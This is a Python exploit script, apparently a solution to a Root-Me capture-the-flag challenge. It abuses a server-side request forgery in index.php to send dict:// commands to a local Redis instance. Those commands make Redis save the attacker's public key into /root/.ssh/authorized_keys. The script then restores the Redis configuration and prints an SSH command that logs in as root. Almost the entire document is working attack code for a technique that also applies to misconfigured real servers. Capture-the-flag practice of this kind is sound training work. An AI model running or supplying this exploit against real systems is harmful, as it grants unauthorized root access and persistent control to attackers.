#Python3
# Adjust those variables to the server hosting the challenge and the way it answers to a request
url = 'http://ctf01.root-me.org/'
header = b'REDIS0006\xfe\x00\x00\x06'
trailer = b'\n\xff\xe7\x1fa\x10\x9bm\tB'
# Ajust this variable to the path where to dump data on you machine
path = '/home/kali/.ssh/' # directory save public key (created by: ssh-keygen -t rsa -C "root@ctf01.root-me.org")

import requests
headers = {}
file_dir = '/root/.ssh'
file_name = 'authorized_keys'
file = open (f'{path}id_rsa.pub', 'rb')
file_contents = file.read ()
file.close ()
file_contents = b'\n\n' + file_contents + b'\n\n'
redis_key = 'poison'
commands = [
        f'config set dir {file_dir}',
        f'config set dbfilename {file_name}',
        f'set {redis_key} "{file_contents}"',
        'save',
        f'get {redis_key}',
        f'del {redis_key}',
        'config set dir /var/lib/redis/6379',
        'config set dbfilename dump.rdb'
]
for c in commands:
        print (f'{c}')
        response = requests.post (f'{url}index.php', headers=headers, data={'url': f'dict://localhost:6379/{c}'}).content.decode ('utf-8')
        start = response.rfind ('<br />')
        start = response.find ('\n', start) + 1
        end = response.find ('</pre>', start)
        response = response[start:end]
        print (f'{response}')

print("done! Run: ssh -i .ssh/id_rsa root@ctf01.root-me.org  to play with server:> ")